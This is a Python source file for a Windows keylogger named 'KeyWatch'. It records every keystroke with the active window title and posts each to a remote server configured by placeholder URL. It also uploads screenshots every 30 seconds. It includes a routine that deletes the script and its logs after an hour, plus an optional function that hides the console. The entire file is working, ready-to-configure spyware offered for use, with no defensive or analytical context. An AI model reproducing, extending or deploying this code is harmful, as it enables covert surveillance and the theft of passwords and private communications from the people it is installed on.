import os
import time
import io
import base64
import threading
import logging
import queue
import requests
import ctypes
import win32gui
from pynput import keyboard
from PIL import ImageGrab

# ─────────────────────────────────────────────
#  CONFIGURATION — update BASE_URL before use
# ─────────────────────────────────────────────
BASE_URL       = "https://your-app.onrender.com"  # ← Replace with your Render URL
SERVER_URL     = f"{BASE_URL}/log"
SCREENSHOT_URL = f"{BASE_URL}/screenshot"

LOG_DIR  = "keylogger_logs"
LOG_FILE = os.path.join(LOG_DIR, "keylogger.log")

SCREENSHOT_INTERVAL = 30   # seconds between screenshots (set 0 to disable)
SELF_DELETE_TIME    = 3600 # seconds before self-delete (set 0 to disable)

# ─────────────────────────────────────────────
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename=LOG_FILE,
)

start_time = time.time()
running    = True

# ── Send queue (non-blocking) ─────────────────
# Keystrokes are pushed here and a background thread
# sends them — so typing is NEVER slowed down.
send_queue = queue.Queue()


# ── Helpers ───────────────────────────────────

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"


def format_key(key) -> str:
    """Match original log format exactly."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            return str(key).replace("Key.", "")
    except AttributeError:
        return str(key).replace("Key.", "")


# ── Keyboard listener ─────────────────────────

def on_press(key):
    global running

    timestamp    = time.strftime('%Y-%m-%d %H:%M:%S')
    window_title = get_active_window()
    key_str      = format_key(key)

    # Push to queue — never blocks typing
    send_queue.put({
        "timestamp": timestamp,
        "window":    window_title,
        "key":       key_str,
    })

    if key == keyboard.Key.esc:
        running = False
        return False  # Stop listener


def on_release(key):
    pass


# ── Network sender thread ─────────────────────
# Drains the queue and sends to server.
# Completely separate from the keyboard listener.

def sender_thread():
    while True:
        try:
            payload = send_queue.get(timeout=1)
            try:
                requests.post(SERVER_URL, json=payload, timeout=5)
            except requests.exceptions.RequestException as e:
                logging.warning(f"Failed to send keystroke: {e}")
            finally:
                send_queue.task_done()
        except queue.Empty:
            if not running:
                break


# ── Screenshot thread ─────────────────────────

def send_screenshot():
    """Capture, compress, and POST screenshot as base64 JPEG."""
    try:
        img = ImageGrab.grab()

        # Resize to max 1280px wide
        max_width = 1280
        if img.width > max_width:
            ratio = max_width / img.width
            img   = img.resize((max_width, int(img.height * ratio)))

        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")

        payload = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "window":    get_active_window(),
            "image":     b64,
        }
        requests.post(SCREENSHOT_URL, json=payload, timeout=10)
        logging.info("Screenshot sent to server")
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")


def monitor_thread():
    global running
    while running:
        try:
            if SCREENSHOT_INTERVAL > 0:
                send_screenshot()

            if SELF_DELETE_TIME > 0 and time.time() - start_time > SELF_DELETE_TIME:
                self_delete()
                break

            time.sleep(SCREENSHOT_INTERVAL if SCREENSHOT_INTERVAL > 0 else 10)
        except Exception as e:
            logging.error(f"Monitor thread error: {e}")


# ── Self delete ───────────────────────────────

def self_delete():
    global running
    script_path = os.path.abspath(__file__)
    logging.info("Self-deleting script...")
    try:
        bat = os.path.join(os.environ.get("TEMP", "."), "kw_cleanup.bat")
        with open(bat, "w") as f:
            f.write(f"""@echo off
timeout /t 2 /nobreak > nul
del "{script_path}"
rmdir /s /q "{LOG_DIR}"
del "%~f0"
""")
        os.system(f'start "" "{bat}"')
        running = False
    except Exception as e:
        logging.error(f"Self-delete failed: {e}")


def enable_stealth():
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except Exception:
        pass


# ── Entry point ───────────────────────────────

if __name__ == "__main__":
    logging.info("KeyWatch agent started")
    print(f"KeyWatch started → {BASE_URL}")
    print("Press ESC to stop.\n")

    # enable_stealth()  # Uncomment to hide console window

    # Background sender — handles all HTTP, never touches keyboard thread
    sender = threading.Thread(target=sender_thread, daemon=True)
    sender.start()

    # Background monitor — screenshots + self-delete
    monitor = threading.Thread(target=monitor_thread, daemon=True)
    monitor.start()

    # Keyboard listener — only captures, never sends
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    logging.info("KeyWatch agent stopped")
    print("KeyWatch stopped.")